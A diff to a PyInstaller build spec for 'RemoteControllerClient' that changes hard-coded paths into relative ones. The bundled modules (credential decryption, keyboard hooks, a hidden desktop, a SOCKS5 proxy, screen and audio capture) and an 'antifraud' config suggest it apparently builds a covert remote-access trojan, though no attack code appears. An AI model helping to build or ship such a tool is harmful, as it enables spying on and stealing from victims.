@@ -1,33 +1,46 @@
 # -*- mode: python ; coding: utf-8 -*-
-from PyInstaller.utils.hooks import collect_all
+from __future__ import annotations
 
-datas = [('C:\\Users\\USER\\AppData\\Local\\Temp\\rc_build_ahpyqgxw\\remote_client\\rc_team_id.txt', 'remote_client'), ('C:\\Users\\USER\\AppData\\Local\\Temp\\rc_build_ahpyqgxw\\remote_client\\rc_antifraud.json', 'remote_client'), ('C:\\Users\\USER\\AppData\\Local\\Temp\\rc_build_ahpyqgxw\\remote_client\\rc_server.json', 'remote_client'), ('C:\\Users\\USER\\AppData\\Local\\Temp\\rc_build_ahpyqgxw\\remote_client\\rc_activity.env', 'remote_client')]
-binaries = []
-hiddenimports = ['win32crypt', 'cryptography', 'pynput', 'pynput.mouse', 'pynput.keyboard', 'remote_client.apps', 'remote_client.apps.launcher', 'remote_client.windows.hidden_desktop', 'remote_client.proxy.socks5_server']
-tmp_ret = collect_all('pynput')
-datas += tmp_ret[0]; binaries += tmp_ret[1]; hiddenimports += tmp_ret[2]
-tmp_ret = collect_all('av')
-datas += tmp_ret[0]; binaries += tmp_ret[1]; hiddenimports += tmp_ret[2]
-tmp_ret = collect_all('aiortc')
-datas += tmp_ret[0]; binaries += tmp_ret[1]; hiddenimports += tmp_ret[2]
-tmp_ret = collect_all('sounddevice')
-datas += tmp_ret[0]; binaries += tmp_ret[1]; hiddenimports += tmp_ret[2]
-tmp_ret = collect_all('mss')
-datas += tmp_ret[0]; binaries += tmp_ret[1]; hiddenimports += tmp_ret[2]
-tmp_ret = collect_all('numpy')
-datas += tmp_ret[0]; binaries += tmp_ret[1]; hiddenimports += tmp_ret[2]
+from pathlib import Path
 
+from PyInstaller.utils.hooks import collect_all, collect_submodules
+
+base_dir = Path(__file__).resolve().parent  # .../client
+remote_pkg_dir = base_dir / "remote_client"
+
+datas: list[tuple[str, str]] = []
+for filename in ("rc_team_id.txt", "rc_antifraud.json", "rc_server.json", "rc_activity.env"):
+    path = remote_pkg_dir / filename
+    if path.exists():
+        datas.append((str(path), "remote_client"))
+
+binaries: list[tuple[str, str, str]] = []
+hiddenimports = [
+    "win32crypt",
+    "cryptography",
+    "pynput",
+    "pynput.mouse",
+    "pynput.keyboard",
+    "remote_client.config",
+]
+hiddenimports += collect_submodules("remote_client")
+
+for module in ("pynput", "av", "aiortc", "sounddevice", "mss", "numpy"):
+    tmp_ret = collect_all(module)
+    datas += tmp_ret[0]
+    binaries += tmp_ret[1]
+    hiddenimports += tmp_ret[2]
 
 a = Analysis(
-    ['C:\\Users\\USER\\remote_controller\\client\\client.py'],
-    pathex=[],
+    ["client.py"],
+    pathex=[str(base_dir)],
     binaries=binaries,
     datas=datas,
     hiddenimports=hiddenimports,
     hookspath=[],
     hooksconfig={},
     runtime_hooks=[],
-    excludes=['numpy.f2py.tests', 'pytest'],
+    excludes=["numpy.f2py.tests", "pytest"],
     noarchive=False,
     optimize=0,
 )
@@ -39,7 +52,7 @@ exe = EXE(
     a.binaries,
     a.datas,
     [],
-    name='RemoteControllerClient',
+    name="RemoteControllerClient",
     debug=False,
     bootloader_ignore_signals=False,
     strip=False,
@@ -53,3 +66,4 @@ exe = EXE(
     codesign_identity=None,
     entitlements_file=None,
 )
+
